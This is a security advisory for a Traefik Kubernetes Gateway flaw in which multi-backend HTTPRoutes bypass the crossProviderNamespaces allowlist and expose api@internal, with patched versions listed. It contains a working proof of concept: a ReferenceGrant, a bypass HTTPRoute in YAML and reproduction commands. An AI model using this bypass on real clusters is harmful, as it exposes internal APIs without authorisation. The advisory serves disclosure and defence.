# [M] Traefik: Kubernetes Gateway crossProviderNamespaces bypass allows HTTPRoute outside the allowlist to expose internal Traefik services

## Summary
Severity: Medium
Advisory: GHSA-3g6v-2r68-prfc
CVE: CVE-2026-54761
CWE: CWE-284, CWE-863
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N (CVSS_V3)
Published: 2026-06-17
Source: https://github.com/advisories/GHSA-3g6v-2r68-prfc
Type: github-advisory

## Affected
- Go: `github.com/traefik/traefik/v3` — affected >=0 <3.6.21
- Go: `github.com/traefik/traefik/v2` — affected >=0
- Go: `github.com/traefik/traefik` — affected >=0
- Go: `github.com/traefik/traefik/v3` — affected >=3.7.0-ea.1 <3.7.5

## Details
## Summary

There is a high severity vulnerability in Traefik's Kubernetes Gateway provider affecting the `crossProviderNamespaces` allowlist. For `HTTPRoute` rules that declare multiple (WRR) backendRefs, Traefik evaluates the allowlist against the target `backendRef.namespace` instead of the route's own namespace. As a result, an `HTTPRoute` created in a namespace that is not allow-listed can reference a cross-provider `TraefikService` such as `api@internal`, `dashboard@internal` or `rest@internal` by pointing `backendRef.namespace` at an allow-listed namespace covered by a Gateway API `ReferenceGrant`, exposing internal Traefik services on the data plane. Exploitation requires the ability to create an accepted `HTTPRoute` and a matching `ReferenceGrant` from an allow-listed namespace ; it does not require any change to Traefik static configuration, RBAC, or the deployment itself.

## Patches

- https://github.com/traefik/traefik/releases/tag/v3.6.21
- https://github.com/traefik/traefik/releases/tag/v3.7.5

## For more information

If you have any questions or comments about this advisory, please [open an issue](https://github.com/traefik/traefik/issues).

<details>
<summary>Original Description</summary>

# Summary

The Kubernetes Gateway provider's `crossProviderNamespaces` option is documented as restricting which Gateway API route namespaces may declare `TraefikService` backendRefs.

For `HTTPRoute` rules with multiple backendRefs, Traefik checks this allowlist against `backendRef.namespace` instead of the `HTTPRoute` namespace. A route in a namespace that is not allow-listed can therefore add `api@internal` to the generated WRR service by setting `backendRef.namespace` to an allow-listed namespace, as long as a normal Gateway API `ReferenceGrant` permits that cross-namespace reference.

Verified affected versions:

- `v3.7.1` (`fa49e2bcad7ffd8a80accdf1fae1ae480913d93d`)
- current source/master tested by me (`29406d42898547f1ffabd904f66af06c212740cf`)

# Expected Behavior

With:

```yaml
providers:
  kubernetesGateway:
    crossProviderNamespaces:
      - trusted
```

only Gateway API routes whose own namespace is `trusted` should be allowed to declare `TraefikService` backendRefs such as `api@internal`, `dashboard@internal`, or `rest@internal`.

An `HTTPRoute` in namespace `attacker` should not be able to expose an internal Traefik service by setting:

```yaml
backendRefs:
  - group: traefik.io
    kind: TraefikService
    name: api@internal
    namespace: trusted
```

# Actual Behavior

For an `HTTPRoute` in namespace `attacker` with two backendRefs, Traefik generates a WRR service containing:

```text
[api@internal attacker-whoami-http-80]
```

even though `crossProviderNamespaces` only allows `trusted`.

# Threat Model

This does not require changing Traefik static configuration or Traefik process state. The relevant boundary is the Kubernetes Gateway provider's `crossProviderNamespaces` policy: namespaces outside the allowlist should not be able to declare cross-provider `TraefikService` backendRefs.

The precondition is a Gateway API environment where an untrusted or less-trusted namespace can create `HTTPRoute` objects accepted by a Gateway, and a namespace in the `crossProviderNamespaces` allowlist has a matching `ReferenceGrant`. `ReferenceGrant` should satisfy Gateway API cross-namespace reference rules, but it should not override Traefik's separate provider-level namespace allowlist for cross-provider internal services.

A Gateway API `ReferenceGrant` should be treated as necessary but not sufficient for this case. It authorizes the cross-namespace object reference under Gateway API rules, but Traefik's `crossProviderNamespaces` option is an additional Traefik-specific security control for cross-provider `TraefikService` backendRefs, especially `@internal` services. Therefore a `ReferenceGrant` from `trusted` must not make a route in `attacker` equivalent to a route whose own namespace is `trusted`.

# Required Attacker Capability

Required:

- create or modify an `HTTPRoute` in namespace `attacker`;
- have that `HTTPRoute` accepted by a `Gateway`;
- rely on an existing `ReferenceGrant` from an allow-listed namespace, or on a delegated namespace setup where such `ReferenceGrant` objects are managed separately from Traefik's provider configuration.

Not required:

- modifying Traefik static configuration;
- modifying the Traefik deployment or Traefik RBAC;
- modifying resources in the Traefik deployment namespace;
- modifying `providers.kubernetesGateway.crossProviderNamespaces`;
- enabling `api.insecure`;
- exposing the dashboard/API entrypoint directly.

# Documentation Evidence

The documented boundary is the namespace of the Gateway API route/resource that declares the cross-provider reference, not the namespace named in `backendRef.namespace`.

The Kubernetes Gateway provider option is documented as:

```text
List of namespaces from which Gateway API routes (HTTPRoute, TCPRoute, TLSRoute) are allowed to declare a backendRef of kind TraefikService.
```

The migration notes also describe the security reason for the option:

```text
those references ... allow a user to cross namespace boundaries, as well as exposing @internal services, that only the operator should be able to expose.
```

and the documented behavior is:

```text
["ns-a"] | Only Kubernetes resources in the listed namespaces can declare cross-provider references.
```

The provider struct uses the same route-namespace wording:

```go
CrossProviderNamespaces []string `description:"List of namespaces from which Gateway API routes are allowed to declare TraefikService backendRef references." ...`
```

The reproduced route kind is `HTTPRoute`; no Gateway API experimental-channel resources are required for the PoC.

# PoC

I validated the issue end-to-end in a local `kind` cluster with Traefik `v3.7.1`, real Gateway API CRDs, real Kubernetes `Gateway`, `HTTPRoute`, and `ReferenceGrant` resources, and HTTP requests to Traefik's normal `web` entrypoint.

The complete local reproducer I used is a self-contained `kind` PoC with these files:

```text
external-repro-kind/kind-config.yaml
external-repro-kind/traefik-v371.yaml
external-repro-kind/gateway-exploit.yaml
external-repro-kind/run-kind-repro.sh
```

Run command:

```bash
./external-repro-kind/run-kind-repro.sh
```

The script creates a local `kind` cluster, loads local `traefik:v3.7.1` and `traefik/whoami:v1.11.0` images, installs Gateway API CRDs, deploys Traefik and the PoC Gateway resources, sends the control and exploit `curl` requests to `127.0.0.1:18080`, prints route status, and deletes the cluster on exit.

Traefik was started with:

```text
--api=true
--api.dashboard=true
--api.insecure=false
--providers.kubernetesgateway=true
--providers.kubernetesgateway.crossprovidernamespaces=trusted
```

The local host entrypoint was:

```text
127.0.0.1:18080 -> kind NodePort -> Traefik web entrypoint
```

The target namespace has a normal Gateway API `ReferenceGrant`:

```yaml
apiVersion: gateway.networking.k8s.io/v1beta1
kind: ReferenceGrant
metadata:
  name: allow-attacker-to-traefikservice
  namespace: trusted
spec:
  from:
    - group: gateway.networking.k8s.io
      kind: HTTPRoute
      namespace: attacker
  to:
    - group: traefik.io
      kind: TraefikService
```

Positive control:

```yaml
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: single-backend-control
  namespace: attacker
spec:
  parentRefs:
    - name: shared-gateway
      namespace: default
  hostnames:
    - control.localhost
  rules:
    - matches:
        - path:
            type: PathPrefix
            value: /api
      backendRefs:
        - group: traefik.io
          kind: TraefikService
          name: api@internal
          namespace: trusted
          port: 80
          weight: 1
```

Bypass:

```yaml
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: mixed-backend-bypass
  namespace: attacker
spec:
  parentRefs:
    - name: shared-gateway
      namespace: default
  hostnames:
    - exploit.localhost
  rules:
    - matches:
        - path:
            type: PathPrefix
            value: /api
      backendRefs:
        - group: traefik.io
          kind: TraefikService
          name: api@internal
          namespace: trusted
          port: 80
          weight: 1000000
        - group: ""
          kind: Service
          name: whoami
          port: 80
          weight: 1
```

Observed external result:

```text
control: single-backend route from attacker namespace should not expose api@internal
control status: 404
404 page not found

exploit: mixed backendRef route from attacker namespace exposes api@internal
exploit returned Traefik API JSON
api@internal status: enabled
weighted members:
api@internal              1000000
attacker-whoami-http-80  1
```

The `HTTPRoute` status shows the boundary difference:

```text
single-backend-control:
  Accepted=True
  ResolvedRefs=False
  Reason=RefNotPermitted
  Message=Cannot load HTTPRoute BackendRef api@internal: internal service reference is not allowed: HTTPRoute namespace "attacker" is not in crossProviderNamespaces

mixed-backend-bypass:
  Accepted=True
  ResolvedRefs=True
```

This is the externally visible security failure: the same route namespace and same `api@internal` backendRef are rejected in the single-backend path, but accepted in the mixed/WRR path and exposed on the data plane.

## Minimized Root Cause Test

I also created a provider-level regression test using Traefik's fake Kubernetes/Gateway clients. This does not rely on the Docker lab, dashboard exposure, or helper backends. It is useful as a minimal root-cause test, but the external `kind` PoC above is the primary impact reproduction.

Files:

- `probe/crossprovider_namespace_probe_test.go`
- `probe/cross_provider_namespace_probe.yml`
- `probe/cross_provider_namespace_single_control.yml`

Reproduction:

```bash
cp probe/crossprovider_namespace_probe_test.go pkg/provider/kubernetes/gateway/
cp probe/cross_provider_namespace_probe.yml pkg/provider/kubernetes/gateway/fixtures/httproute/
go test ./pkg/provider/kubernetes/gateway -run TestProbeCrossProviderNamespacesHTTPRouteBackendNamespaceBypass -count=1 -v
```

Observed output on both tested versions:

```text
Messages: HTTPRoute namespace attacker must not expose api@internal when only trusted is allow-listed; members=[api@internal attacker-whoami-http-80]
```

The reproducer also includes a positive control:

```text
=== RUN   TestProbeCrossProviderNamespacesHTTPRouteSingleBackendControl
--- PASS: TestProbeCrossProviderNamespacesHTTPRouteSingleBackendControl
```

That control shows the single-backend internal-service code path rejects the setup correctly. The bypass appears when the same forbidden internal backend is placed in a mixed/WRR backendRef list.

# Root Cause

The single-internal-service path checks the route namespace:

```go
case len(routeRule.BackendRefs) == 1 && isInternalService(routeRule.BackendRefs[0].BackendRef):
    if !isCrossProviderNamespaceAllowed(p.CrossProviderNamespaces, route.Namespace) {
```

The mixed/multiple backendRef path calls `loadService`. In `loadService`, `namespace` is overwritten from `backendRef.Namespace`, then passed to `loadHTTPBackendRef`:

```go
namespace := route.Namespace
if backendRef.Namespace != nil && *backendRef.Namespace != "" {
    namespace = string(*backendRef.Namespace)
}
...
name, service, err := p.loadHTTPBackendRef(namespace, backendRef)
```

`loadHTTPBackendRef` then checks `crossProviderNamespaces` against this target namespace:

```go
if *backendRef.Kind == "TraefikService" && strings.Contains(string(backendRef.Name), "@") {
    if !isCrossProviderNamespaceAllowed(p.CrossProviderNamespaces, namespace) {
```

This lets a disallowed route namespace choose an allow-listed target namespace and pass the check.

# Impact

An untrusted route namespace may expose internal Traefik services through Gateway `HTTPRoute` despite being excluded from `crossProviderNamespaces`.

Potentially exposed internal services include:

- `api@internal`
- `dashboard@internal`
- `rest@internal`

This is a route isolation / internal service exposure / security option bypass. Practical severity depends on whether internal services are enabled and how Gateway `ReferenceGrant` delegation is used, but the observed behavior violates the documented security boundary of `crossProviderNamespaces`.

I also validated the concrete impact of the generated service graph in the local lab. The lab's intended safe baseline has the dashboard/API protected on the dashboard entrypoint:

```text
Host: dashboard.localhost -> dashboard entrypoint /api/rawdata => 401 Unauthorized
Host: dashboard.localhost -> web entrypoint /api/rawdata => 404 Not Found
```

When a router on the normal web entrypoint references `api@internal`, the same API endpoint becomes unauthenticated:

```text
Host: impact-crossprovider.localhost -> web entrypoint /api/rawdata => 200 OK
service: api@internal
```

A WRR service containing `api@internal` also exposes the API:

```text
Host: impact-crossprovider-wrr.localhost -> web entrypoint /api/rawdata => 200 OK
weighted services:
api@internal 1000
echo-svc      1
```

This is the security consequence of the provider bug: a namespace that should be blocked by `crossProviderNamespaces` can make Traefik generate a service graph containing `api@internal` on a route it controls.

# Suggested Fix

For Gateway `HTTPRoute` `TraefikService` cross-provider backendRefs, validate `crossProviderNamespaces` against `route.Namespace` in all code paths, including mixed/WRR backendRefs.

</details>

---

## References
- https://github.com/traefik/traefik/security/advisories/GHSA-3g6v-2r68-prfc
- https://nvd.nist.gov/vuln/detail/CVE-2026-54761
- https://github.com/traefik/traefik
- https://github.com/traefik/traefik/releases/tag/v3.6.21
- https://github.com/traefik/traefik/releases/tag/v3.7.5
